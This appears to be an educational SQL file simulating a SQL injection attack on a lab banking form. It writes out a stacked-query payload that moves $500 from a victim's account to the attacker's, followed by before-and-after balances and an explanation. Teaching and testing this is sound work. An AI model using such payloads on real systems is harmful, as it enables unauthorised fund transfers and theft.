-- ==========================================================
-- SQL Injection: Unauthorized Fund Transfer Simulation
-- Simulated Environment: SQLite + Flask (local lab only)
-- ==========================================================
-- Scenario:
--   A banking form asks users to enter their account number.
--   The backend inserts the input directly into a SQL query
--   with no validation or sanitization.
--
-- Attacker : John Doe   | Account: 256101 | Balance: $10,000
-- Victim   : Homer Simpson | Account: 256304 | Balance: $10,300
-- ==========================================================

-- STEP 1: What the app expects the user to enter
256101

-- Resulting query:
-- SELECT Balance FROM Accounts WHERE Account_Num = 256101


-- STEP 2: What the attacker actually enters in the form field
256304; UPDATE Accounts SET Balance = Balance - 500 WHERE Account_Num = 256304; UPDATE Accounts SET Balance = Balance + 500 WHERE Account_Num = 256101; --

-- What the database actually executes:
-- SELECT Balance FROM Accounts WHERE Account_Num = 256304;
-- UPDATE Accounts SET Balance = Balance - 500 WHERE Account_Num = 256304;
-- UPDATE Accounts SET Balance = Balance + 500 WHERE Account_Num = 256101;
-- -- (comment block ends the query, ignores anything after)


-- ==========================================================
-- EXPECTED STATE CHANGE
-- ==========================================================

-- BEFORE ATTACK:
-- Account 256101 | John Doe       | Checking | $10,000.00
-- Account 256304 | Homer Simpson  | Checking | $10,300.00

-- AFTER ATTACK:
-- Account 256101 | John Doe       | Checking | $10,500.00  (+$500)
-- Account 256304 | Homer Simpson  | Checking | $9,800.00   (-$500)

-- ==========================================================
-- WHY IT WORKS
-- ==========================================================
-- The semicolon (;) terminates the original SELECT query early.
-- The database then executes the injected UPDATE statements.
-- No authentication check. No transaction log. No authorization.
-- The app never validates whether the input is just a number.
-- ==========================================================
